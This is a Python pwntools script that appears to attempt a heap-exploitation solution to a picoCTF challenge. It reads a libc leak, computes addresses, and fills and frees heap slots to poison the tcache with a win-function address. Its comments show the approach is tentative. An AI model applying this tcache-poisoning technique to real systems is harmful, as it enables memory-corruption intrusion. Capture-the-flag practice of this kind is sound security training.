#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'  
PORT = 29476

context.log_level = 'info'

p = remote(HOST, PORT)

# Dialog
p.recvuntil(b'So, you want to be a hero?')
p.sendline(b'y')

# Get leak
data = p.recvuntil(b'>')
leak = int(data.split(b'Take this: ')[1].split(b'\n')[0], 16)
log.info(f"Leak: 0x{leak:x}")

libc_base = leak - 0x21fd0
system = libc_base + 0x4f4e0
WIN = 0x400a02

# The array of pointers is at 0x602060
# Maybe we can corrupt it somehow

# Allocate all 7 slots
for i in range(7):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(str(0x100 - 8).encode())  # 248
    p.recvuntil(b'description')
    p.sendline(chr(65+i).encode() * 248)
    p.recvuntil(b'>')

# Now all slots are full
# Free them in a specific order
for i in [6, 5, 4, 3, 2, 1, 0]:
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(str(i).encode())
    p.recvuntil(b'>')

# All are free, tcache is populated
# Allocate back with poisoned data

p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'248')
p.recvuntil(b'description')

# Write WIN address multiple times
payload = p64(WIN) * 31
p.send(payload)
p.recvuntil(b'>')

# Allocate more
for i in range(6):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'8')
    p.recvuntil(b'description')
    p.sendline(p64(WIN))
    p.recvuntil(b'>')

# Try to trigger by freeing
for i in range(7):
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(str(i).encode())
    
    try:
        resp = p.recv(1024, timeout=0.5)
        if b'picoCTF' in resp:
            log.success("FLAG FOUND!")
            flag_start = resp.index(b'picoCTF')
            flag_end = resp.index(b'}', flag_start) + 1
            print(f"\n{'='*60}")
            print(f"FLAG: {resp[flag_start:flag_end].decode()}")
            print(f"{'='*60}\n")
            break
    except:
        pass

p.close()